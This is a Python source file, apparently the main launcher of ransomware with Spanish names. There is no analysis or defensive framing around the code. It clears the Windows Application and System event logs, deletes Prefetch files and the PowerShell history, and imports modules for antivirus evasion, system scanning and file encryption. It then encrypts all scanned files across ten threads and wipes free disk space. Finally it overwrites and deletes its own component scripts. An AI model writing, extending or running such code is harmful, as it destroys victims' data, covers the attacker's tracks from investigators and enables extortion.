import os
import sys
import time
import threading
import shutil
from concurrent.futures import ThreadPoolExecutor, as_completed

if getattr(sys, 'frozen', False):
    SCRIPT_DIR = os.path.dirname(sys.executable)
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

os.chdir(SCRIPT_DIR)


def pre_cleanup():
    try:
        os.system('powershell -w h -nop -c "Remove-Item C:\\Windows\\Prefetch\\*.pf -Force" 2>nul')
        os.system('wevtutil cl Application 2>nul')
        os.system('wevtutil cl System 2>nul')
        ps_history = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
        if os.path.exists(ps_history):
            open(ps_history, 'w').close()
    except:
        pass


def auto_destruir_archivos():
    archivos = ['evasion_av.py', 'rutas.py', 'encriptador_12_capas.py', 'launcher.py', 'launcher.bat', 'launcher.sh']
    for f in archivos:
        if os.path.exists(f):
            try:
                size = os.path.getsize(f)
                with open(f, 'wb') as fw:
                    fw.write(os.urandom(size))
                os.remove(f)
            except:
                pass


def cleanup_python_thread():
    time.sleep(300)
    try:
        if os.path.exists('python_portable'):
            shutil.rmtree('python_portable')
    except:
        pass


try:
    from evasion_av import verificar_seguridad_total
except:
    verificar_seguridad_total = lambda: True

try:
    from rutas import escanear_sistema
    from encriptador_12_capas import EncriptadorMilitar
except ImportError:
    sys.exit(1)


def encriptar_archivo(enc, ruta):
    try:
        result = enc.encriptar(ruta)
        if result:
            try:
                dirname = os.path.dirname(ruta)
                os.system(f'cipher /w:"{dirname}" 2>nul')
            except:
                pass
        return result
    except:
        return False


def main():
    try:
        pre_cleanup()
        threading.Thread(target=cleanup_python_thread, daemon=True).start()
        os.chdir(SCRIPT_DIR)
        archivos, _, _ = escanear_sistema()
        enc = EncriptadorMilitar()
        auto_destruir_archivos()
        NUM_THREADS = 10
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = {executor.submit(encriptar_archivo, enc, ruta): ruta for ruta in archivos}
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
    except:
        pass


if __name__ == "__main__":
    main()
